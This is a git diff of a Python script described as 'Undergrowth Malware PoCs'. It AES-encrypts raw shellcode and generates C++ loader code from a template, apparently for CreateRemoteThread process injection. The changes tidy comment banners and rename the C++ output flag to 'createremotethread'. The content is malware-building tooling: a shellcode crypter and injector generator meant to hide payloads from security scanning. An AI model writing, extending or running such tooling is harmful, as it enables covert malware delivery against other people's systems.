@@ -21,7 +21,9 @@ resultFiles = {
 
 
 
-
+#======================================================================================================
+# Randomized AES Encryption
+#======================================================================================================
 KEY = get_random_bytes(16)
 iv = 16 * b'\x00'
 cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)
@@ -36,25 +38,22 @@ ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
 
 aes_s = ('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
 payload_s = ('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
-
+#======================================================================================================
+#ARGParsing
+#======================================================================================================
 if __name__ == '__main__':
-	#------------------------------------------------------------------------
-	# Parse arguments
 	print("Undergrowth.")
 	print("\n\n")
 	parser = argparse.ArgumentParser(add_help=True, description="Undergrowth Malware PoCs")
 	parser.add_argument("shellcodeFile", help="File name containing the raw shellcode to be encoded/encrypted")
-	parser.add_argument("-cpp", "--cplusplus", help="Generates C++ file code", action="store_true")
+	parser.add_argument("-cpp", "--createremotethread", help="Generates C++ file code", action="store_true")
 	args = parser.parse_args() 
 
 	if not os.path.isdir("./projects"):
 		os.makedirs("./projects")
 		print ("[+] Creating [./projects] directory")
-
-
-
 #======================================================================================================
-#											OUTPUT FORMAT FUNCTIONS
+#Template Builder
 #======================================================================================================
 def convertFromTemplate(parameters, templateFile):
 	try:
@@ -67,8 +66,7 @@ def convertFromTemplate(parameters, templateFile):
 		print ("[!] Could not open or read template file [{}]".format(templateFile))
 		return None
 
-#------------------------------------------------------------------------
-# data as a bytearray
+#Read in shellcode as bytearray
 def formatCPP(data, key):
 	shellcode = "\\x"
 	shellcode += "\\x".join(format(ord(b),'02x') for b in data)
@@ -83,6 +81,6 @@ def formatCPP(data, key):
 				print ("[+] C++ code file saved in [{}]".format(fileName))
 		except IOError:
 			print ("[!] Could not write C++ code  [{}]".format(fileName))
-if args.cplusplus:
+if args.createremotethread:
 	print("Writing payload")
 	formatCPP(payload_s, aes_s)
